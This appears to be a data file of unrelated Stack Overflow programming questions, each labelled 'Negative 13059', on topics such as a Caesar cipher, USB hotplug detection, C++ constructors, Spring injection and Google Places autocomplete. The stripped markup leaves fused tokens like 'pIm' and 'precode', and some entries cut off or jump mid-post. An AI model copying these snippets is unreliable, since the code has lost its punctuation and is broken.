Negative 13059 pIm currently working on an encryption project, and I correctly implemented a Caesarian function in my program, but I need to implement another encryption method.p  pemInstructions We will use a modified version called Pseudorandom offset. We wont need to predistribute a booket, just a password, and those are shorter and dont need to be written down. The password is then used to seed the python random number generator, as described above. You should start with the Caesarian code, but instead of creating one offset at the beginning of the function, create a new one for every single character.emp  pBelow is my Code for the Caesarian. Can anyone provide an example for maybe one character in the code so I can kind of follow along with whats going on Im new to python and am still learning. p  precodedef Caesarianfin, fout, encryptordecryptchoice, alphabet      Determine the offset by generating a random number in the correct range.

Negative 13059 pI would like to monitor the the USB bus of a computer running Windows for unplug events.  When a device is unplugged, I would like to know its USB address, vendor id, the root hub id and the hub ports above the device.  For example usbaddr 10, vendorid 1234, productid 5678, busid 2, portpath 543p  pThis would mean it is a device on bus id 2 port 5 and there is another hub plugged in and on port 4 of that hub there is another hub and on port 3 of that hub is the device being reported.p  pI am trying to write a small OSspecific chunk of code to do USB device hotplug detection to integrate into a larger crossplatform Linux, Windows, Mac testing program.  The code that uses this hotplug code is written in Python 3, so I would prefer to write the hotplug code in Python as well, but Im a little bit flexible on that, but I really want to avoid anything that requires me to pay for a license.p  pIt seems like there are two main optionsp  pIve seen some discussion of the Windows API function RegisterDeviceNotification, but its not clear to me whether it is possible to register to receive events for all USB devices or whether you need to know a GUID for the specific device interface eg. keyboards, mice, etc.  If thats the case, it seems that this solution wont work as I want to monitor all USB devices.p  pThe other option seems to involve something called WMI which seems to come up mostly in discussion of managed code which would to force me into writing this component in a .NET language such as C or IronPython.  This question a hrefhttpstackoverflow.comquestions3331043getlistofconnectedusbdevicesGet List of connected USB Devicesa asks about how to query for USB devices and provides an example, but it doesnt deal with hotplug events and user Nedko suggests that class a hrefhttpmsdn.microsoft.comenuslibrarywindowsdesktopaa39450528vvs.8529.aspx relnofollowWin32USBControllerDevicea should have been used rather than Win32USBHub.

Negative 13059 pConsider the following code not exactly what Im using but just to highlight the problemp  precodeclass Pointarr creates an array of points which can be recalled by object      public     Pointarrint, int, bool     Pointarr      mutable Point array[]      private     void fillarrayint const      int const minpix     int const mirrors     bool const canvasfeed   void Pointarrfillarrayint mirrors const      Point zero0,0     forint i  0 i lt mirrors i              array[i]  zero        PointarrPointarrMat dt, int mpx, int mir, bool cf  dotdt, minpixmpx, mirrorsmir, canvasfeedcf      fillarraymirrors  codepre  pIll get some things out of the way first, im using the gcc c compiler natively on linux. I am using the OpenCV libraries in which Point is a variable type which holds coordinates in the format x,y. I believe it simply uses enough space in the memory to hold each number so for two integers it would be 4bytes for x and 4bytes for y.p  pThe problem Im having is that the variables in the constructor declaration Pointarr initialise properly, I confirmed this, but when I call the fillarrayint function which fills the array with a load of zero values, 0,0, it causes the variables mirrors and minpix to both change to 0 where as canvasfeed stays as it is but this is only when mirrors is equal to 1.p  pNow, lets specify some things, youll note when mirrors is 1, the loop within fill array only runs once, this means that array only has one value one Point. If I set mirrors to 2 then canvasfeed also becomes 0. I think it is fairly clear that the fillarray function is assigning the same memory used to hold my private variables to the array and as such is changing my private variables. This is a problem because I need them to for later.p  pThe thing is, I was lead to believe that making the private variables const means that the compiler will complain if at any point the variables are changed but it compiles fine in this case, if im honest though I dont completely understand how const should be used hardly even.p  pSo finally the question is, how do I avoid making the array use this other memory I need but still initialise it to have the same amount of element slots as mirrors.p

Negative 13059 pIm writing a multithreaded program in the D programming language, but am pretty new to the language.

Negative 13059 pIs there a difference when I want to convert an integerfor example 32bit integerint to another integer typefor example 8bit integerbyte. Here is some example code for the two ways I can convert itp  precodebyte fooint value      return value lt this causes problems because I need to convert it to byte     First waymost people use this    return bytevalue this involves casting the value and also works if value is floating point type     Second way    return value amp byte.MaxValue byte.MaxValue is a constant that is 255  codepre  pSo is there any difference between the two I know that bitwise operations only work for integer types. I know that the second way is not quite readable or recommended. Except that is there any difference of the output of both ways.

Negative 13059 pIve been looking at adding iTunes Library access to a Mac app Im developing.p  pI looked at some of the existing open source implementations, such as a hrefhttpsgithub.comkgnEyeTunes relnofollowEyeTunesa and a hrefhttpsgithub.comiMediaSandboxingiMedia relnofollowiMediaa  but found them to not be quite what I was looking for. Overkill in general.p  pSo I tried out using the a hrefhttpdeveloper.apple.comlibrarymacdocumentationCocoaConceptualScriptingBridgeConceptsIntroductionIntroduction.html relnofollowScripting Bridgea, and found that while functional it was slow. And since I didnt really need to control iTunes, the slowness was not worth it. It also had the downside of relying on iTunes to be running. It also is a bit irritating to get it working in a sandboxed app though possible. p  pSo I finally started to roll my own by reading the iTunes Library.xml file. That seems to be working OK. But in the process of investigating the meaning of the Distinguished Kind keyvalue I stumbled upon a brand new, Apple supplied iTunesLibrary.framework p  pBeautiful  a hrefhttpsdeveloper.apple.comlibrarymacdocumentationiTunesLibraryReferenceiTunesLibraryFrameworkReference relnofollowthe iTunesLibrary framework docs are here.a p  pHowever, when I try to initialize the framework using the code as shown in the reference linkp  precodeNSError  error  nil ITLibrary library  [ITLibrary libraryWithAPIVersion1.0 erroramperror] codepre  pIt returns nil and provides the very helpful error like so in my Sandboxed appp  blockquote   pError DomainNSPOSIXErrorDomain Code100001 Could not load.

Code signing is required. The sample code in the answer is a handy starting point for using the framework. Additionally, in my case the problem was also that the iTunesLibrary framework code does not appear to work when the iTunes library is hosted on a network drive. Make this a bit of a deal breaker unless Apple fixes it.p

Negative 13059 pI would like to ask whether its a good approach to redirect from within a model instead of a controller.p  pThe reason I want to do that is because it is easier to unit test redirection from a model I just pass a mock redirector object to the model in my tests as opposed to controller which is more difficult to unit test. It also keeps controller thinner as all I do in the controller is create an instance of the model and pass it parameters from the request object. There is not a single ifelse in the controller this way.p  pIs it a bad practise p

Negative 13059 pI work with a browser application, built in javascriptjQuery, that opens up a popoverdialog when pressing a certain button. The popover is aligned to that button. If we resize the browser window we want the popover to close, so we listen to the resize event and close the popover. But the problem is when we access the application in a browser in an iPad. If we enter something in one of the input fields inside the popover, and then chooses to hide the keyboard by pressing the hide keyboard button, a resize event occures and the popover is closed. And we do not want it to close in this case. p  pDoes anyone has an idea of how we can solve this Can we capture that the keyboard is closed I have only found notifications used in Apps, not in browser web sites.

Negative 13059 pThis is a strange problem that Im having, and Im not sure whether its an Umbraco issue or something more high level.p  pTo explain we have a node where a backend user uploads a file, and then ticks a box and presses save. When they press save, if the tickbox is ticked, then we should process what they uploaded. To achieve this, I call a function using the codeDocument.AfterSafe  new Document.SaveEventHandlerMethodCallcode line, and then I check that the checkbox is ticked, and go from there.p  pThis all works for the first time. But when a user uploads a new file a couple of days later, the code doesnt run. The only way to get it to run, is to recopy the .dll into the bin folder, and then press save.p  pDoes this ring a bell for anyone at all It seems as though the .dll stops listening for the SaveEventHandler after the first time.p

Negative 13059 pI have a staic library called CommonUtils.lib. It also includes a class called Standardconverter which inherits a base class Converter that is not in static library.p  pI have another static library called Utils.lib. It holds the base class Converter which is inherited by standardconverter class. This library is linked to a DLL called Utils.dll with a exported function SendToClient. Inside SendToClient function, it calls overridden function in p  pStandardConverterCommonUtils.lib p  pThe Utils.dll is loaded by java class through JVM and my problem is I couldnt able to call the overridden function of StandardConverter class. p  precode Utils.lib  class Converter   Public      Converter      Converter      virtual void SetAdditionalData       CommonUtils.lib   class StandardConverterpublic Converter    Public     StandardConverter      StandardConverter      void SetAdditionalData      Utils.dll  Exported function   declspec dllexport void stdcall SendToClient        AdaptorgtGetConvertergtSetAdditionalData      Server.exe  Converter pConverter  new StandardConverter  AdaptorgtSetConverter pConverter   codepre  pDuring startup server sets the converter type. The same process creates the JVM and inside the Java class, it loads the Utils.dll and calls exported function SendToClient. But here it calls the base class function and not calls the StandardConverter. I think that it happens due the difference in address space. Actually the StandardConverter object is initialized and set from process Server.exe. But the dll loaded by JVM doesnt know about dynamic object and it always loads base class function only Is my understanding is correctp  pSomebody can suggest some solution to solve this issue and to call overrided function in standardConverter from JVMp

Negative 13059 pIm trying to create a filter so the user can choose any of 40 fields to display in a query result that has been dynamically created via VBA.  p  pThis is something I see standard in a lot of programs so I figure someone must have code that does it without me reinventing the wheel.  Unfortunately I havent been able to find it online.p  pBasically when it starts all the field names are listed in the left box and the right box is empty.  The user can click a right arrow button to move the fields into the right box or a left arrow to remove them and put them back in the left box.  Also the user can use up and down arrow buttons to change the order of a selected field in the right listbox.p  pOnce I have the right listbox populated and ordered correctly I know how to execute the query properly.p

Negative 13059 pWe are building a Windows Store App in VS2012 that depends on a C main UI project, several C projects for supporting code, and an external proprietary library.

Negative 13059 pConsider the example.p  pI have a container class codeAcode, which overloadsimplements all kinds of arithmetic operators codeAnegatecode.p  pI now wish to create derived classes codeBcode and codeCcode.p  pcodeBcode and codeCcode should have all operators implemented by codeAcode.p  pstrongHowever, those operators should use derivedclass objects as arguments.strongp  pThe prototype for codeBnegatecode should be codeB Bnegatecode, instead of the codeA Bnegatecode.p  pThe derived classes do not need any own fields, but may implement own methods codeBfoocode, codeCbarcode. It is a requirement that codeBcode and codeCcode be incompatible, i.e., a codeBcode object can not be assigned to a codeCcode object, or used with any of codeCcodes operators.p  pHere is the example code, how I want it to workp  precodestruct A          int val          A negate                  return Aval            struct B A void foo struct C A void bar  int main          B obj0  5         B obj1  obj0.negate  codepre  pI understand that this is probably impossible using standard inheritance, and might be something C11 simply isnt capable of, so Im asking for something as close as possible to it.p  pThe currently best solution Ive come up with involves not using inheritance at all, but instead adding an integer template parameter to the base class, defining derived classes as codeusing B  Alt1gtcode,codeusing C  Alt2gtcode, and implementing member methods only for some specializations only codeAfoolt1gtcode and codeAbarlt2gtcode.p  pHowever, Im highly unhappy with this solution.p

Negative 13059 pFirst off, I would like to say that this is an assignment for my CS161 class, so while a direct answer would be nice, a nice explanation will help me more than anything. We have covered structs this week, but I am having trouble with some of my code. My goal right now for the program is to read from a file called QBInfo.txt into an array of three structures.p  precodestruct QuarterBack     string name     int completions[kNumGames]     int attempts[kNumGames]     int yards[kNumGames]     int touchdowns[kNumGames]     int interceptions[kNumGames]   QuarterBack players[kNumPlayers]  player1, player2, player3 codepre  pAlso, if it helps I should say that kNumPlayers is a constant set to 3, and kNumGames is a constant set to 10. p  pThis is the code I am using to read from my file. It doesnt seem to work right though, and I have been at a loss as to why, so I figured I might ask the community for some help.p  precodeifstream myIF     myIF.openQBInfo.txt     string trash     string temp     getlinemyIF, trash     forint i  0 i lt kNumPlayers i         getlinemyIF, temp         players[i].name  temp         forint j  0 i lt kNumGames j             myIF gtgt players[i].completions[j]             myIF gtgt players[i].attempts[j]             myIF gtgt players[i].yards[j]             myIF gtgt players[i].touchdowns[j]             myIF gtgt players[i].interceptions[j]               codepre  pHere is the test case file that my instructor has provided.

Negative 13059 pI am working on a project for the Pebble platform. Apps are written in C, and my question is not specific to that platform. p  pThe Pebble API has a Struct called a hrefhttpsdeveloper.getpebble.comsdkrefgroupwalltime.htmlstructpbltm relnofollowPblTma that is populated every second by a line of code. My goal is to compare the struct with the current time. I have created PblTm structs and populated them with the times I need to compare against. I only care about the hour and minute sections of the structs. So far, I have the following code.p  precodebool comptimeint h1, int m1, int h2, int m2, int h3, int m3       ifh1lth2  ampamp h2lth3 Is start hour lt now hour lt end hour              ifh1h2 ampamp m2gtm1 If start hour  now hour, is now min gt start min                       return true                   ifh2h3 ampamp m2ltm3 If end hour  now hour, if now min lt end min                      return true                  ifh1gth2 ampamp h2lth3 If start hour lt now hour lt end hour                      return true                   else              return false          return false   codepre  pI initially tried to feed the structs themselves as parameter to the function something likep  precodecomptimeampfirststart,ampnow,ampfirstend codepre  pAnd then referenced the elements of the struct inside the function, I could never get that to compile, and I couldnt find information on it. I may have not have been searching for the correct terms.p  pI then changed to feeding the int parameters to the function itself like thisp  precodecomptimefirststart.tmhour,firststart.tmmin,now.tmhour,now.tmmin,firstend.tmhour,firstend.tmmin codepre  pIt is a quite clumsy way of doing it, but I have already done the work to type it all out. My main problem however, is that the comparison function doesnt function. It returns apparently randomly, I have not been able to find a pattern true for values that do not fit and false for some that fit. p  pDo you have any ideas p

Negative 13059 pAs a hobby and to learn, whether this is possible, Im trying to implement a simple ego shooter for Android. Unfortunately, I ran into a dead end when dealing with mouse event processing. p  pI already have an codeonGenericMotioncodeListener, which processes codeMotionEventcode objects generated by the system framework. The problem is, that codeMotionEventcode objects, generated by a mouse merely contain emabsoluteem coordinates, which tend to get stuck, once the cursor reaches an edge or a corner of the screen. So Im thinking relative mouse coordinates. While I found no feature on codeMotionEventcode that could deliver relative movements, usingp  pcodeadb shell su  getevent lt devinputevent3codep  pand examining its output revealed that the kernel generates distinct relative motion events when one tries to move the cursor, even when it is stuck in a corner of the screen. So, given that my shooter has su access, I could obtain relative movements.p  pAnd now the question A little bit of Googlefu revealed, that in many ego shooters, the typical mouse movement is achieved by p  ol liusing relative mouse coordinates andli liby emrepositioningem the mouse cursor in the center of the screen.li ol  pSo, the question really is twofoldedp  ol liIs it possible to reposition the mouse cursor in the center of the screen on Android andli liIf not, can the typical egoshooter mouse movement be realised by using relative mouse movement information aloneli ol

Negative 13059 pMy question is reasonably simple How do I obtain a pointer to the object calling a function, without passing codethiscode   p  pThe reason I am asking, however, is slightly more complex.  p  pI am led to ask this because I am writing a class named codeSubordnateRegistrycode, which contains a heterogeneous list of lists of function delegates  callable objects with different signatures.  p  pWhichever classes wish to have delegates called must register themselves, of course, with the type of data which they wish to receive, and either a pointer to the object or an alreadyconstructed delegate.  A call from inside a class codeBarcode might look like thisp  precodeARegistry.Subscribe ltFoogt amp Bar BarFunction, this codepre  pOr like thisp  precodeusing namespace std placeholders auto Func  std bind amp Bar BarFunction, this, 1 ARegistry.Subscribe ltFoogt Func codepre  pBecause codestd functioncode is more versatile you can bind any callable, including lambdas, I would prefer to use that over raw pointers.  p  pMy problem lies in the fact that I have to specify codethiscode all the time.  If I pass an invalid pointer, or end up registering an object which is not related at all, then I will end up invoking UB at some indeterminate point in the future with no idea where it came from or where the root of the error is.  Nasty  p  pNow, if youre wondering what happens if the caller is not an object a free function, then the element will simply remain registered forever, as I will never automatically remove unregister the callable, as it never destructs.p  pAny ideas, or is this impossible as I was led to believe  Is preprocessor magic an option  Is there a better way p  pOf course, any questions are welcome.  Thanks for your time .  p

Negative 13059 pI have not been able to find a definitive answer about this. In asp.net MVC 5, when some fields are required only if some condition is true, we will need to implement a custom validation attribute by inheriting from ValidationAttribute.

I wish that the ValidationResult class had a constructor that takes a collection of error messages.p  pSo, do I have to split this custom validation attribute into 2 custom validation attribute classes, one of which says MustSelectCoachIfNewbieAttribute and the other one says MustSpecifyDominantHandIfNewbieAttribute  p  pIs it possible to accomplish this in a single custom validation attribute class  Thanks.p

Its pretty solid, but I require a weekly updated trendline to add to this data.p  pWhat id like is a macro that does the followingp  ol liWrite data to range strongXstrong e.g. A1A5li liCopy data from range strongXstrong to Range strongYstrong e.g. A10A15li ol  pAnd then when I run step 1 and 2 againp  ol liWrite data to range strongXstrong  overwrite data in X A1A5li liCopy Data from range strongYstrong to range strongY1strong e.g. B10B15li ol  prepeat ad infinitum each time moving one column to the rightp  pWhat I get is that i need to define the column line as an integer and then refer to it. e.g.p  precodeSub Trend  Dim i As Integer i  2 SheetsData.Select RangeA1A5.Select Selection.Copy SheetsTrendline data.Select ActiveSheet.Cells1, i.Select  Selection.PasteSpecial PastexlPasteValues, OperationxlNone, SkipBlanks      False, TransposeFalse   SheetsData.Select i  i  1  End Sub codepre  pHowever repeating this macro does not increment i for me. p  pemAlso column 2 is filled completely with a repeat of the data in DataA1A5em This is fixed with an update to the code.p  pPretty much what I need to fix is that The line p  precode Dim i As integer   i  2 codepre  pbecomesp  precodeDim i As integer   i  3 codepre  pPermanently, and repeat the next time for i  4, i  5 etc.p  pAfter that for me it is easy to create a line chart from this rangep  pThank you.p  pedit wrote what I thought would work, but apparently doesntp

Negative 13059 pI am stuck with a serious problem in my Angular JS application. I have a main JSP page along with another HTML page. p  pFor examplep  pHTML  test.htm and JSP  index.jspp  pMy data is forwarded some text fields from the test page to the jsp page through the ActiveX Object. In my JSP page I have an inline script tag at the start where I capture the data coming in from the test.htm page. Followed by this are the Angular library and other application related filesapp.js, services.js, controllers.js etcp  pMy Jsp looks like this  p  precodeltscriptgt    function abcdataRecievedThroughActiveXObject        some processing on the data and then forward it to the app.js which is loaded   below           ltscriptgt ltscript srcall other angular files  library loadedgt codepre  pNow when my JSP page launches the abc function is supposed to run First called by the test page and also considering order of loading the JavaScript. However my app.js runs before my abc function. This has been the issue from the past few weeks. I have tried a lot of things dynamically loading the Javascript within abc, changing the order of loading the JS files and many more things, however this has always been the issue. At one point I started thinking that may be Angular JS takes precedence over nativenormal JS. I am very new to this. I am sorry if I am wrong. But I need some help. p  pPlease let me know if more detail is needed.p  pHelp Highly Appreciated. Thanksp

Negative 13059 pI am creating a table header view with two UILabels. The constraints look like this img srchttpi.stack.imgur.com9uufN.png altenter image description here titlelabels The top UILabel is attached to the top, leading and trailing edges of the container. The bottom UILabel has the leading and trailing edges aligned to the top label, and the bottom edge to the bottom of the container. There is also a vertical spacing constraint between the two UILabels. All views emtranslatesAutoresizingMaskIntoConstraintsem have been set to NO of course. BTW, the whole thing is made in code.p  pI calculate the height of the UIView by getting the intrinsic content size of each label and padding so that I can create the rect of the container view and add it to the UITableView. Like this  code     floatcalculateHeightwithMaxWidthfloatmaxWidth              float totalHeight  0         const float containerPadding  30         const float maxHeight  1000         maxWidth  maxWidth  containerPadding         UIFont nameFont  [UIFont fontWithNameAvenirNextRegular size18]         UIFont descriptionFont  [UIFont fontWithNameAvenirNextRegular size13]         CGSize nameSize  [productNameLabel.text gsSizeWithFontnameFont                                                  withMaximumSizeCGSizeMakemaxWidth, maxHeight]         CGSize descriptionSize  [productDescriptionLabel.text gsSizeWithFontdescriptionFont                                                                withMaximumSizeCGSizeMakemaxWidth, maxHeight]             totalHeight  nameSize.height  descriptionSize.height  containerPadding        return totalHeight      codep  pThis code works perfectly in iOS 7 and has been working for several versions. Now that Im testing in iOS 8 I get a crash with unsatisfying constraints. If I see the constraints of the view before calling layoutIfNeeded everything looks great, but after calling it I see two new constraints, which are the width and height constraints of the container view. I never created this constraints, and in iOS 7 never needed to.p  pEven after creating these constraints myself to fix this, I get even more errors trying to break them. Am I missing something Did the logic for constraints change in iOS 8p  pThanksp

Negative 13059 pI have an sql view V which has a 01 correspondence to a table X.  I would like to join this view onto another table, Y, which has a reference to X type XId. I have specified the view as I would any other table in persistent.  Vs id column is  a reference to X, but declaring the view as a table in persistent naturally gives it the type VId instead of XId.  And so I cant join the view onto Y because the types dont match up.p  pI realize I can do this with rawSQL, but my query also has an IN clause, which doesnt seem to play well with a list of values using rawSQL. Another option is to select the XId column twice in the view, and specify the extra one as having type XId in the model definition. Lastly I could fall back to inserting the view query inline or doing the query entirely with raw sql, skipping persistents interpolation.p  pIs there a way to do this without resorting to the methods above Id prefer to use esqueleto if possible. p

Negative 13059 pI am trying to improve the performance of some code of mine, that first constructs a 4x4 matrix depending on two indices, diagonalizes this matrix and then stores the eigenvectors of each diagonalization of each matrix in an 4dimensional array. At the moment I am just going through all the indices serially and then store the eigenvectors in its place in the 4dimensional array. Now, I am wondering if it is possible to parallelize this a little bit by using threading or something similar such that each thread would diagonalize one matrix and then store it in its place. The problem I have is, what are my limitations in doing this Would I run into problems when different threads want to write into the resulting 4dim. array at the same time and do I have to use a lock in order to prevent this I am sorry if this question is trivial, but by searching I was not able to find anything related and my knowledge about threading is very limited. A minimal example would bep  precodefrom numpy.linalg import eigh as eigh2 from scipy import   spectrum  zeros[L2,L2,4,4],complex for i in range0,L2     for j in range0,L2         k  [2  i2piL,2  j2piL]         H  ones[4,4],complex         energies, states  eigh2H         spectrum[i,j,,]  states codepre  pNote that I have exchanged the function that constructs the matrix in dependence of k for some constant matrix for sake of brevity.p  pI would really appreciate any help or pointers to resources how I could implement some parallelizations.

Negative 13059 pSuppose you have a codeUIViewcode that displays data from some model object. When the model changes in the background, it notifies its listeners via some subscription mechanism a pretty common pattern... p  pWhat Ive been doing on iOS is subscribing to the model notifications in a codeViewControllerscode codeviewWillAppearcode refreshing the appropriate views in response to the change notification and ceasing my subscription in codeviewWillDisappearcode. This way, it was ensured that I wouldnt waste resources by tracking the changes when the given view controller was offscreen, so I was happy with this solution.p  pHowever, my current project needs some views, that track a model object, and they are used all over the place in several view controllers. If I would use the previous approach, then the subscriptionunsubscription plumbing would have to be duplicated in many view controllers. I was wondering, whether this logic could be put in the view itself Although the codeUIViewscode lifecycle events willMoveToSuperview and willMoveToWindow have somewhat vague semantics in this regard, this has to be possible, since thats what Apple is doing with the iAd display views  i.e. ADBannerView doesnt require any plumbing to start displaying ads aside from putting it in your view hierarchy, and its pullin data from remote sources, so it must not be wasting resources by having unnecessary subscriptions to the iAd servers.  Has anyone done this thing I.e. reliably coupling expensive changetracking mechanisms with the codeUIViewcode lifecycle eventsp

The layout for codeLOCcode looks like thisp  precodeobjectname title codepre  pthe layout for codeSPcode looks likep  precodename title codepre  pThe idea is to fill the codeSP title columncode using data from the codeLOC title columncode, where the query checks if the NAME from SP is listed in OBJECTNAME under LOC, then takes the codeLOC.Titlecode and puts it in codeSP.Titlecodep  pFor example, In my strongsharepointstrong library I have a file called strongperformance.docstrong, which has no data in the codetitle columncode, strongperformance.docstrong is also available in codeLOC.objectnamecode and has the title that I need on my strongsharepointstrong list.p  pIm using the following query to test some resultsp  precodeSELECT SP.Name,LOC.objectname,SP.Title,Loc.Title FROM SP, LOC WHERE SP.Name LIKE   LOC.objectname   codepre  pThis gives me a list of items from codeLOCcode which are also in codeSPcode, and the Title values for both Columns, locally and on sharepoint.p  pThe query i tried to use to update the title column was thisp  precodeUPDATE SP SET SP.Title   SELECT LOC.Title FROM LOC WHERE LOC.ObjectName LIKE   SP.Name    codepre  pI get the following errorp  precodeOperation must use an updateable query codepre  pSo obviously the above doesnt work, im probably looking at it all wrong but i cant seem to figure it out, since the result from the first query shows that the data that i need it shouldnt be this hard to get it to work.p  pAny help is greatly appreciated.p  pIf I run a simple update query like codeSET Title  1code, it works, so its not permission based.p
Negative 13059 pWe used to have a setup on IIS 7.5.  1 IIS has 2 websites both run on 443.

In this system strongattendeesstrong are members of an strongattendee groupstrong, which belong to a strongconferencestrong.

Therefore becomes redundant data.p  pTo me, it feels like it might violate some form of normalization, but I plan on keeping it in for the speed boost as described.

Negative 13059 pIve got a problem with sorting on a manytomany relationship. What Im trying to achieve seems like it should be fairly straightforward, but after a lot of banging my head against Fuel, I still cant get it to work.p  pIncidentally, I realise moreorless this question has been a hrefhttpstackoverflow.comq10788210180500asked beforea, but since a at that time it wasnt possible to sort on a lazyloading relationship, and b Ive got a lot more detail of the exact problem Im having, I thought it would be worth asking as a separate question...p  pHeres the problem Im havingp  pI have an Item model. Items can have children which are also items, joined via a manytomany relationship through an itemsitems table with a parentid and childid column. The itemsitems table also has a sortorder column, so that the order of the child items can be set.p  pCreating a separate model for this relationship seemed like overkill to me, so the order is updated by an observer that updates child items sortorder when the parent is saved via an eventaftersave method on ModelItem. This seems to work fine.p  pHowever, the problem Im having is that I can get sort order working either with lazy loading emorem with eager loading, but not both. Whichever one works, the other throws Fuel errors, so the only way currently of getting both eager and lazy loading to work is to scrap the orderby clause when eagerloading. Here are the three ways Ive tried defining the children relationshipp  pstrongApproach 1strongp  ul liThis is the approach that the a hrefhttpfuelphp.comdocspackagesormrelationsmanymany.htmlmanymany relnofollowrelevant page in FuelPHPs documentationa suggests should work.li lipNo errors on eager or lazy load, but either way, orderby is not respected child items are ordered by id, not by sortorderp  precodechildren gt array     tablethrough    gt itemsitems,     keythroughfrom gt parentid,     keythroughto   gt childid,     modelto         gt ModelItem,     orderby gt array         itemsitems.sortorder gt ASC     ,  codepreli ul  pstrongApproach 2strongp  ul liWorks as desired with eager loadingli lipCauses Fuel error with lazy loading emColumn not found 1054 Unknown column itemsitems.sortorder in order clauseem This seems to be because itemsitems is aliased to t0through in the JOIN clause, but not in the ORDER BY clause.p  precodechildren gt array     tablethrough    gt itemsitems,     keythroughfrom gt parentid,     keythroughto   gt childid,     modelto         gt ModelItem,     conditions            gt array         orderby gt array             itemsitems.sortorder gt ASC         ,       codepreli ul  pstrongApproach 3strongp  ul liWorks as desired with lazy loadingli lipCauses Fuel error with eager loading effectively the reverse of take 2, abovep  precodechildren gt array     tablethrough    gt itemsitems,     keythroughfrom gt parentid,     keythroughto   gt childid,     modelto         gt ModelItem,     conditions            gt array         orderby gt array             t0through.sortorder gt ASC         ,       codepreli ul  pIn a slightly desperate hack, I tried combining approaches 2 and 3 above by defining two separate relationships children and child  one for eager loading, the other for lazy loading, but it still breaks my app, because it makes the delete process throw similar errors. I could attempt to fix this, but I feel like that would just be piling hack upon hack. What Id like instead is a solid way of ordering child items that works whether they were eager or lazy loaded. Fuels docs suggest this should be doable approach 1, above, but I just cant get that to work...p  pAny help would be very much appreciatedp

One of those is a splash screen form.  When the app context runs, it displays this form, and updates the current status on the form depending on whats happening at initialization.  p  pThis object is quite temporary, and once I dispose it, what does StructureMap do with it  Does it cache the object in some fashion  It seems kind of wasteful to leave the object rooted and disposed if indeed its cached in some fashion.  Should I use a nested container for it  Im trying to avoid passing containers around if I can manage it, and the app context must dispose of this object as it calls Application.Run which is modal.  So is there a good way to handle this situation  I really dont want to leave objects just hanging around, unreachable by the GC when theyre no longer used.p  pThis leads to another design issue that will likely come up  If I click a button, and a new form is created, worked with, and disposed, how would I handle this via StructureMap  I need to create the form at runtime, and only on demand.  And I dont want to keep it around after the user is done with it I consider it wasteful.  If I dispose of the form, and create a new instance using a factory method injected by StructureMap, will it return the previous instance in a disposed state  p  pemAnd just to get this out of the way now hiding it on form close is not an option here.emp  pThis is really a different way of thinking that Im certainly not used to.  So any guidance would be greatly appreciated.p

Negative 13059 pMy data model consists of three objects, lets call them codeAcode, codeBcode and codeCcode. codeAcode has a onetomany relationship to codeBcode, and codeBcode to codeCcode. They are only modeled as interfaces.p  pTo get concrete versions of them, I have interfaces codeAProvidercode, codeBProvidercode and codeCProvidercode which provide create, retrieve, and delete operations.p  pI am now doing an implementation using SpringJPA and Hibernate by the means of codespringbootstarterdatajpacode. For this, I have three codeEntitycodes codeInternalAcode, codeInternalBcode and codeInternalCcode which do not implement the codeAcode, codeBcode and codeCcode interfaces, but are used as transfer objects only. To access them, I use the autogenerated repositories from Spring see codeCrudRepositorycode.p  pFor creating the real objects, I have implementations of the codeXProvidercode interfaces which inject their necessary dependencies. This structure is the following I prefer codejavax.injectcode style injectionp  precodeComponent public class AProviderImpl implements AProvider       Inject     private InternalARepository aRepository       implementation   Component public class BProviderImpl implements BProvider       Inject     private InternalBRepository bRepository      Inject     private AProvider aProvider       implementation   Component public class CProviderImpl implements CProvider       Inject     private InternalCRepository cRepository      Inject     private BProvider bProvider       implementation  codepre  pI figure out that this should work, and the codeAutowireCapableBeanFactorycode correctly figures out what to instantiate first. But this only works up to the codeBProviderImplcode, e.g., when removing the codeCProviderImplcode. As soon as codeCProviderImplcode exists, initialization fails with codeNo qualifying bean of type [com.somewhere.BProvider] foundcode.p  pIt makes no difference if I use codeAutowiredcode instead of codeInjectcode.p  pI stepped through the initialization process with a debugger and the codeCProvidercode is indeed initialized first, i.e., the bean factory does not correctly figure out that it needs the codeBProvidercode which in turn needs the codeAProvidercode first.p  pMy current workaround is using codeDependsOncode like thisp  precodeComponentmyAProvider public class AProviderImpl implements AProvider  ...   ComponentmyBProvider DependsOnmyAProvider public class BProviderImpl implements BProvider  ...   ComponentmyCProvider DependsOnmyBProvider public class CProviderImpl implements CProvider  ...  codepre  pThis works, but I read elsewhere that this is a code smell and should be avoided because it introduces implicit dependencies. Currently, this is all local to one module, so it is no problem there, but later my model will grow and I will have model elements and providers spread over multiple modules, so I cannot use codeDependsOncode until kingdom come.p  pIs there a better way to tackle thisp

So I tried setting the value of the autocomplete field to just the codestreetnumbercode and coderoutecode from the JSON responsep  precodeif addressType  streetnumber       Set the value to the street number     document.getElementByIdautocomplete.value  val  123   else if addressType  route       Append the street name     document.getElementByIdautocomplete.value     val  123 Main St.   codepre  pThis works...but only while the field is focused. As soon as it loses focus like when you tab to the next field it redisplays the full address again.p  pI cant find any event or anything I can use to prevent the field from redisplaying the full address whenever it loses focus. The Autocomplete class only has one event, a hrefhttpsdevelopers.google.commapsdocumentationjavascriptreferenceevents241 relnofollowcodeplacechangedcodea, which only fires when an autocomplete suggestion is selected.p  pSo I tried a hrefhttpsdevelopers.google.commapsdocumentationjavascripteventsDomEvents relnofollowadding a DOM listenera for the codeblurcode event on the field, so that whenever it loses focus I can set its value back to just the street addressp  precodegoogle.maps.event.addDomListenerdocument.getElementByIdautocomplete, blur, function      document.getElementByIdautocomplete.value  streetAddress     console.logdocument.getElementByIdautocomplete.value  logs 123 Main St.  codepre  pBut even though the log statement shows that the value of the field is set to code123 Main St.code on blur, it still displays the full code123 Main St., Anytown, CA, United Statescode in the browser.p  pIs there any way to achieve what Im trying to do, or do I just have to resort to adding a separate autocomplete fieldp
Negative 13059 pI am evaluating Freescales Kinetis Design Studio for their ARM series microcontrollers.  I was looking at an a hrefhttpwww.element14.comcommunitycommunitydesigncenterkinetiskl2freedomboardblog20140803frdmk64fkinetisdesignstudiokdstutorialtogglinganrgbledusinginterrupts relnofollowexamplea  as a basis to do my first blink an LED project.  When using variables shared between my main program and an ISR such as a counter, I would typically define a volatile global in main.c  and reference it as extern in the ISR.  Their example shows it exactly the opposite and they also dont use the volatile keyword.  I have never seen it done this way.  Is there an advantage to this  BTW, my program works just fine either way.p

